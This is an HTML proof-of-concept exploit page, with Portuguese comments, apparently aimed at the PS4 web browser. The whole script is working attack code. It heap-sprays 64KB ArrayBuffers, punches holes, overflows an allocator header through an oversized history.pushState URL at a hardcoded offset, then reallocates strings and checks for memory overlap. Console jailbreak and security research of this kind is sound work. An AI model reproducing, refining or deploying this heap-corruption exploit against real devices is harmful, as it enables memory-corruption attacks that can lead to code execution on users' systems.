<!DOCTYPE html>
<html>
<head>
    <title>PS4 Size Confusion PoC</title>
    <style>
        body { background-color: #2b1100; color: #ffaa00; font-family: monospace; padding: 20px; text-align: center; }
        button { 
            font-size: 24px; padding: 25px; width: 100%; border: 2px solid #ffaa00; background: #000; color: #fff; font-weight: bold; cursor: pointer;
        }
        #log { text-align: left; margin-top: 20px; border: 1px solid #555; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; background: #111;}
        .win { background-color: #ffaa00; color: #000; font-weight: bold; font-size: 1.2em; padding: 5px;}
    </style>
</head>
<body>

    <h1>Confusão de Tamanho (Header Corruption)</h1>
    <p>Tentando enganar o alocador mudando o tamanho do bloco para 0x01.</p>

    <button onclick="startConfusion()">INICIAR CONFUSÃO</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const ALIGNED_OFFSET = 709520; // O início do cabeçalho que descobrimos
        const OVERFLOW_AMT = 32;       // Só precisamos corromper o cabeçalho, não muitos dados

        // Tamanho médio (64KB) - Foge do IsoHeap de pequenos objetos
        const TARGET_SIZE = 0x10000; 
        const SPRAY_COUNT = 500;

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let style = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${style}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startConfusion() {
            log(`1. Alocando ${SPRAY_COUNT} buffers de 64KB...`);
            
            // FASE 1: SPRAY
            for(let i=0; i<SPRAY_COUNT; i++) {
                let ab = new ArrayBuffer(TARGET_SIZE);
                let view = new Uint8Array(ab);
                view[0] = 0xAA; // Marca original
                victims.push(ab);
            }

            // Buracos para o exploit cair
            log("2. Criando buracos...");
            for(let i=0; i<SPRAY_COUNT; i+=2) {
                victims[i] = null;
            }
            await forceGC();

            // FASE 2: EXPLOIT (Corromper Header)
            log("3. Disparando Overflow no Header Vizinho...");
            
            setTimeout(() => {
                try {
                    // Preenche até o cabeçalho e escreve 0x0101...
                    let buffer = "A".repeat(ALIGNED_OFFSET);
                    buffer += "\x01".repeat(OVERFLOW_AMT);

                    // Dispara
                    history.pushState({}, "size_conf", "/" + buffer);

                    // FASE 3: RE-ALOCAÇÃO
                    // Se corrompemos o header de uma vítima viva (impar), 
                    // o sistema pode achar que aquele espaço está livre ou tem tamanho errado.
                    // Vamos tentar alocar Strings em cima.
                    log("4. Tentando alocar Strings sobre os buffers...");
                    allocOverlaps();

                } catch (e) {
                    log("Erro: " + e.message);
                }
            }, 500);
        }

        function allocOverlaps() {
            // Criamos strings do mesmo tamanho (64KB)
            // Se houver confusão, a string vai sobrescrever os dados do ArrayBuffer
            let pad = "S".repeat(TARGET_SIZE - 100);
            let overlaps = [];

            for(let i=0; i<SPRAY_COUNT; i++) {
                overlaps.push(pad + i);
            }

            log("5. Verificando overlap...");
            checkOverlap();
        }

        function checkOverlap() {
            let success = false;

            // Checa os ArrayBuffers originais que sobraram (impares)
            for(let i=1; i<victims.length; i+=2) {
                let v = victims[i];
                if(!v) continue;

                let view = new Uint8Array(v);
                
                // Se o primeiro byte mudou de 0xAA para 'S' (0x53), temos overlap!
                if (view[0] === 0x53) {
                    log(`!!! SUCESSO !!! Buffer ${i} invadido por String!`, 'win');
                    alert("OVERLAP ACHIEVED!");
                    success = true;
                    break;
                }
                // Se mudou para 0x01, pegamos o overflow direto
                if (view[0] === 0x01) {
                    log(`Atingido por Overflow direto (0x01) no index ${i}.`, 'win');
                }
            }

            if(!success) {
                log("Nenhum overlap. O sistema protegeu os blocos.");
            }
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 800));
        }
    </script>
</body>
</html>
